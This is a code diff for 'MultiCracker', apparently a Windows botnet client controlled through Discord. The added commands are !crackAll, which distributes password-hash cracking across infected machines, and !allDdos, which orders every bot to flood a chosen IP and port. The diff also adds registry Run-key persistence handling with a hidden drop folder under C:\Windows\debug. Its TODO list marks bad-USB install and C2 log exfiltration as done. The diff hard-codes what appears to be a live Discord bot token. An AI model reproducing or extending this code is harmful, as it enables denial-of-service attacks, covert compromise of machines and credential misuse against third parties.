@@ -30,18 +30,19 @@ namespace MultiCracker
         // DONE: Add a way to split the cracking between bots
         // DONE: Add a way to set the hash to crack
         // Add a way to set the hash algorithm (More algorithms)
+        // Faster splitting (splitting without needing to to through all password combinations.)
         // DONE: Better checking for if bots are active or not
         // DONE: Add DDoS commands for the bots (Full on botnet style...)
         // DONE: Bool for hiding form.
         // DONE: Add a way to install hidden persistence.
-        // Quick bad USB install.
+        // DONE: Quick bad USB install.
         // DONE: Add a way to send the log file to the C2.
         // Add a way to elevate to admin.
         // Disable UAC.
         // ----------------------------------------
 
         bool EmergencySTOP = false;
-        private bool DebugMode = false;
+        private bool DebugMode = true;
 
         // Discord
         bool SomeoneElseFoundPassword = false;
@@ -70,7 +71,7 @@ namespace MultiCracker
         int MinLength = 1;
 
         // Communication
-        string BOT_TOKEN = "BOT-TOKEN-HERE";
+        string BOT_TOKEN = "MTE4NDUwMDgwMzE2ODM3ODkwMA.GCBpcP.04tgAqrrDI5MUXzhrXonwkSMwfLwQRYWSNDnQs";
 
         int counter = 0;
 
@@ -194,6 +195,7 @@ namespace MultiCracker
                     help_message += "**!help** - Displays this message.\r\n";
                     help_message += "\r\n**-------------- CRACKING --------------**\r\n";
                     help_message += "**!crack** - Starts cracking the password.\r\n";
+                    help_message += "**!crackAll** - Makes all bots (including itself) crack the password its selected.\r\n";
                     help_message += "**!stop** - Stops cracking the password.\r\n";
                     help_message += "**!setHash** - Sets the hash to crack.\r\n";
                     help_message += "**!status** - Sends status.\r\n";
@@ -221,13 +223,29 @@ namespace MultiCracker
                     Log(new LogMessage(LogSeverity.Info, "Message", $"Sent help message."));
                 }
                 // CRACKING
-                else if (trimmedContent.StartsWith("!crack"))
+                else if (trimmedContent == "!crack")
                 {
                     // Simulate a button press of btnStartCracking
                     btnStartCracking_Click(null, null);
                     await message.Channel.SendMessageAsync("Cracking started... Use **!status** it see its progress!");
                 }
-                else if (trimmedContent.StartsWith("!stop"))
+                else if (trimmedContent == "!crackAll")
+                {
+                    // Find all other bots (including itself)
+                    computers = FindOthers();
+                    // Log the active computers
+                    foreach (var computer in computers)
+                    {
+                        // Send discord message (!crack)
+                        guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+                        channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");
+                        await channel.SendMessageAsync("!crack");
+                        Log(new LogMessage(LogSeverity.Info, "Cracking", $"Started cracking with bot-{computer}..."));
+                    }
+                    // Send discord message
+                    await message.Channel.SendMessageAsync("Cracking started on all bots... Use **!status** it see its progress!");
+                }
+                else if (trimmedContent == "!stop")
                 {
                     btnStopCracking_Click(null, null);
                     await message.Channel.SendMessageAsync("Pushed Emergency Eutton!!! This will halt any cracking.");
@@ -240,6 +258,23 @@ namespace MultiCracker
                     txtTargetHash.Text = hash;
 
                     await message.Channel.SendMessageAsync($"Set hash to: **{hash}**");
+                }
+                else if (trimmedContent.StartsWith("!setAlgorithm"))
+                {
+                    // Find the argument after !setAlgorithm
+                    string argument = trimmedContent.Substring(14);
+
+                    // Check if the argument is valid
+                    if (argument == "SHA256" || argument == "SHA512" || argument == "MD5" || argument == "SHA1" || argument == "SHA384" || argument == "HMACSHA256" || argument == "HMACSHA512" || argument == "HMACMD5")
+                    {
+                        Algorithm = argument;
+                        await message.Channel.SendMessageAsync($"Set algorithm to: **{Algorithm}**");
+                        textBox6.Text = Algorithm;
+                    }
+                    else
+                    {
+                        await message.Channel.SendMessageAsync($"Invalid argument. Please use \"SHA256\", \"SHA512\", \"MD5\", \"SHA1\", \"SHA384\", \"HMACSHA256\", \"HMACSHA512\" or \"HMACMD5\".");
+                    }
                 }
                 else if (trimmedContent.StartsWith("!setMax"))
                 {
@@ -426,6 +461,7 @@ namespace MultiCracker
                         await channel.SendMessageAsync($"!setNumbers {UseNumbersString}");
                         await channel.SendMessageAsync($"!setSymbols {UseSymbolsString}");
                         await channel.SendMessageAsync($"!setCapitals {UseCapitalsString}");
+                        await channel.SendMessageAsync($"!setHash {hash}");
                     }
 
                     // Split the possible passwords between the bots
@@ -437,6 +473,7 @@ namespace MultiCracker
                     // Generate passwords
                     foreach (var password in GeneratePasswords(MinLength, MaxLength, UseLetters, UseNumbers, UseCapitals, UseSymbols))
                     {
+                        // THIS IS WHERE IT TAKES A LONG TIME, I NEED TO FIND A WAY TO MAKE IT FASTER. Potential fix could be 
                         passwords.Add(password);
                     }
 
@@ -520,7 +557,7 @@ namespace MultiCracker
                 {
                     // Send a discord message
                     await message.Channel.SendMessageAsync("Unaliving myself...");
-                    
+
                     // Choose a random last word
                     Random random = new Random();
                     int randomNumber = random.Next(0, 10);
@@ -654,6 +691,18 @@ namespace MultiCracker
                     }
                     else
                     {
+                        // Log whats missing for full persistence
+                        if (!regeditPersistenceInstalled)
+                        {
+                            await message.Channel.SendMessageAsync($"Regedit persistence is not installed. Fixing...");
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is not installed. Fixing..."));
+                        }
+                        if (!exePersistenceInstalled)
+                        {
+                            await message.Channel.SendMessageAsync($"Exe persistence is not installed. Fixing...");
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is not installed. Fixing..."));
+                        }
+
                         // Check if admin
                         bool isAdmin = IsAdministrator();
                         if (!isAdmin)
@@ -689,16 +738,26 @@ namespace MultiCracker
                                 Log(new LogMessage(LogSeverity.Info, "Persistence", $"Directory already exists: {dropPoint}"));
                             }
 
-                            // Move everything in current directory to drop point
-                            string[] files = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory);
-                            foreach (string file in files)
+                            try
                             {
-                                string fileName = Path.GetFileName(file);
-                                string fullFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
-                                string newFilePath = Path.Combine(dropPoint, fileName);
-                                File.Move(fullFilePath, newFilePath);
+                                // Move everything in current directory to drop point
+                                string[] files = Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory);
+                                foreach (string file in files)
+                                {
+                                    string fileName = Path.GetFileName(file);
+                                    string fullFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, fileName);
+                                    string newFilePath = Path.Combine(dropPoint, fileName);
+                                    File.Move(fullFilePath, newFilePath);
+                                    // Log
+                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Moved {fileName} to {dropPoint}"));
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Error moving files to drop point: {ex.Message}");
                                 // Log
-                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Moved {fileName} to {dropPoint}"));
+                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error moving files to drop point: {ex.Message}"));
                             }
 
                             // Create registry key
@@ -715,17 +774,183 @@ namespace MultiCracker
                             catch (Exception ex)
                             {
                                 // Send discord message
-                                await message.Channel.SendMessageAsync($"Error installing persistence: {ex.Message}");
+                                await message.Channel.SendMessageAsync($"Error adding registry key: {ex.Message}");
                                 // Log
-                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error installing persistence: {ex.Message}"));
+                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error adding registry key: {ex.Message}"));
                             }
                         }
                     }
 
-                    
+
                 }
                 else if (trimmedContent == "!uninstall")
                 {
+                    // Using registry to uninstall persistence
+
+                    // Variables
+                    string keyName = "MultiCracker";
+                    bool anyPersistenceInstalled = false;
+                    bool exePersistenceInstalled = false;
+                    bool regeditPersistenceInstalled = false;
+                    string dropPoint = "C:\\Windows\\debug\\multi";
+                    string exePath = Application.ExecutablePath;
+                    string exeName = Path.GetFileName(exePath);
+                    string fullExePath = Path.Combine(dropPoint, exeName);
+
+
+                    // Check if regedit persistence is already installed
+                    RegistryKey keyCheck = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    string[] subKeys = keyCheck.GetValueNames();
+                    foreach (string subKey in subKeys)
+                    {
+                        if (subKey == keyName)
+                        {
+                            regeditPersistenceInstalled = true;
+                        }
+                    }
+
+                    // Check if the executable is in droppoint
+                    if (File.Exists(fullExePath))
+                    {
+                        exePersistenceInstalled = true;
+                    }
+
+                    // Check if both are installed
+                    if (regeditPersistenceInstalled || exePersistenceInstalled)
+                    {
+                        anyPersistenceInstalled = true;
+                    }
+
+                    if (anyPersistenceInstalled)
+                    {
+                        // Log whats missing for full persistence
+                        if (regeditPersistenceInstalled)
+                        {
+                            await message.Channel.SendMessageAsync($"Regedit persistence is installed. Removing...");
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is installed. Removing..."));
+                        }
+                        if (exePersistenceInstalled)
+                        {
+                            await message.Channel.SendMessageAsync($"Exe persistence is installed. Removing...");
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is installed. Removing..."));
+                        }
+
+                        // Check if admin
+                        bool isAdmin = IsAdministrator();
+
+                        // if not admin
+                        if (!isAdmin)
+                        {
+                            // Send discord message
+                            await message.Channel.SendMessageAsync($"Error uninstalling persistence. Not admin. (Use **!elevate** to ask for elevation)");
+                            // Log
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Not admin."));
+                            return;
+                        }
+                        else
+                        {
+                            // Log
+                            Log(new LogMessage(LogSeverity.Info, "Persistence", $"Uninstalling persistence..."));
+
+                            // Delete registry key
+                            try
+                            {
+                                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                                key.DeleteValue(keyName);
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Removed registry key!");
+                                // Log
+                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Removed registry key!"));
+                                regeditPersistenceInstalled = false;
+                            }
+                            catch (Exception ex)
+                            {
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Error removing registry key: {ex.Message}");
+                                // Log
+                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error removing registry key: {ex.Message}"));
+                            }
+
+                            // Delete files in drop point
+                            try
+                            {
+                                string[] files = Directory.GetFiles(dropPoint);
+                                foreach (string file in files)
+                                {
+                                    string fileName = Path.GetFileName(file);
+                                    string fullFilePath = Path.Combine(dropPoint, fileName);
+                                    File.Delete(fullFilePath);
+                                    // Log
+                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted {fileName} from {dropPoint}"));
+                                }
+                                exePersistenceInstalled = false;
+                            }
+                            catch (Exception ex)
+                            {
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Error deleting files from drop point: {ex.Message}");
+                                // Log
+                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting files from drop point: {ex.Message}"));
+                            }
+
+                            // Delete drop point
+                            try
+                            {
+                                Directory.Delete(dropPoint);
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Deleted drop point!");
+                                // Log
+                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Deleted drop point!"));
+                            }
+                            catch (Exception ex)
+                            {
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Error deleting drop point: {ex.Message}");
+                                // Log
+                                Log(new LogMessage(LogSeverity.Error, "Persistence", $"Error deleting drop point: {ex.Message}"));
+                            }
+
+                            // Check if both are installed
+                            if (regeditPersistenceInstalled || exePersistenceInstalled)
+                            {
+                                anyPersistenceInstalled = true;
+                            }
+
+                            if (!anyPersistenceInstalled)
+                            {
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Persistence uninstalled!");
+                                // Log
+                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence uninstalled!"));
+                            }
+                            else
+                            {
+                                // Send discord message
+                                await message.Channel.SendMessageAsync($"Error uninstalling persistence. Please try again.");
+                                // Log
+                                Log(new LogMessage(LogSeverity.Info, "Persistence", $"Error uninstalling persistence. Please try again."));
+
+                                // Send discord message and log what is still installed
+                                if (regeditPersistenceInstalled)
+                                {
+                                    await message.Channel.SendMessageAsync($"Regedit persistence is still installed.");
+                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Regedit persistence is still installed."));
+                                }
+                                if (exePersistenceInstalled)
+                                {
+                                    await message.Channel.SendMessageAsync($"Exe persistence is still installed.");
+                                    Log(new LogMessage(LogSeverity.Info, "Persistence", $"Exe persistence is still installed."));
+                                }
+                            }
+                        }
+                    }
+                    else
+                    {
+                        // Send discord message
+                        await message.Channel.SendMessageAsync($"Persistence is not installed.");
+                        // Log
+                        Log(new LogMessage(LogSeverity.Info, "Persistence", $"Persistence is not installed."));
+                    }
 
                 }
                 // DDoS
@@ -755,6 +980,41 @@ namespace MultiCracker
                         await message.Channel.SendMessageAsync($"Invalid arguments. Please use !ddos <ip> <port> <time>");
                     }
                 }
+                else if (trimmedContent.StartsWith("!allDdos"))
+                {
+                    // Get the aruments (!ddos <ip> <port> <time>)
+                    string argument = trimmedContent.Substring(9);
+                    string[] arguments = argument.Split(" ");
+
+                    // Check if the arguments are valid
+                    if (arguments.Length == 3)
+                    {
+                        // Get the arguments
+                        string ip = arguments[0];
+                        string port = arguments[1];
+                        string time = arguments[2];
+
+                        // Find all other bots (including itself)
+                        computers = FindOthers();
+                        // Log the active computers
+                        foreach (var computer in computers)
+                        {
+                            // Send discord message (!crack)
+                            guild = _client.Guilds.FirstOrDefault(); // Get the first available guild
+                            channel = guild.TextChannels.FirstOrDefault(ch => ch.Name == $"bot-{computer}");
+                            await channel.SendMessageAsync($"!ddos {ip} {port} {time}");
+                            Log(new LogMessage(LogSeverity.Info, "DDoS", $"Started DDoS with bot-{computer}..."));
+                        }
+
+                        // Send discord message
+                        await message.Channel.SendMessageAsync($"Starting DDoS attack on {ip}:{port} with all active bots for {time} seconds...");
+                    }
+                    else
+                    {
+                        // Send discord message
+                        await message.Channel.SendMessageAsync($"Invalid arguments. Please use !ddos <ip> <port> <time>");
+                    }
+                }
                 else if (trimmedContent == "!stopddos")
                 {
                     // Send discord message
@@ -764,6 +1024,7 @@ namespace MultiCracker
                     await Task.Run(() => StopDDoS());
                 }
 
+                // Invalid Command
                 else if (trimmedContent.StartsWith("!"))
                 {
                     await message.Channel.SendMessageAsync("Invalid command. Please use !help for a list of commands.");
@@ -830,7 +1091,6 @@ namespace MultiCracker
                 Console.WriteLine($"Exception during bot startup: {ex}");
             }
         }
-
 
 
         // Spliting
@@ -1157,11 +1417,71 @@ namespace MultiCracker
         public void PassToHash(string pass)
         {
             string hash = "";
+
             byte[] data = Encoding.ASCII.GetBytes(pass);
-            data = new SHA256Managed().ComputeHash(data);
-            foreach (byte b in data)
+            if (Algorithm == "SHA256")
             {
-                hash += b.ToString("x2");
+                data = new SHA256Managed().ComputeHash(data);
+                foreach (byte b in data)
+                {
+                    hash += b.ToString("x2");
+                }
+            }
+            else if (Algorithm == "SHA512")
+            {
+                data = new SHA512Managed().ComputeHash(data);
+                foreach (byte b in data)
+                {
+                    hash += b.ToString("x2");
+                }
+            }
+            else if (Algorithm == "MD5")
+            {
+                data = new MD5CryptoServiceProvider().ComputeHash(data);
+                foreach (byte b in data)
+                {
+                    hash += b.ToString("x2");
+                }
+            }
+            else if (Algorithm == "SHA1")
+            {
+                data = new SHA1Managed().ComputeHash(data);
+                foreach (byte b in data)
+                {
+                    hash += b.ToString("x2");
+                }
+            }
+            else if (Algorithm == "SHA384")
+            {
+                data = new SHA384Managed().ComputeHash(data);
+                foreach (byte b in data)
+                {
+                    hash += b.ToString("x2");
+                }
+            }
+            else if (Algorithm == "HMACSHA256")
+            {
+                data = new HMACSHA256().ComputeHash(data);
+                foreach (byte b in data)
+                {
+                    hash += b.ToString("x2");
+                }
+            }
+            else if (Algorithm == "HMACSHA512")
+            {
+                data = new HMACSHA512().ComputeHash(data);
+                foreach (byte b in data)
+                {
+                    hash += b.ToString("x2");
+                }
+            }
+            else if (Algorithm == "HMACMD5")
+            {
+                data = new HMACMD5().ComputeHash(data);
+                foreach (byte b in data)
+                {
+                    hash += b.ToString("x2");
+                }
             }
 
             // Debug
@@ -1518,8 +1838,11 @@ namespace MultiCracker
             SendHeartbeat();
         }
 
-        
-
+        private void btnElevate_Click(object sender, EventArgs e)
+        {
+            // Elevate to admin
+            ElevateToAdmin();
+        }
     }
 
 }
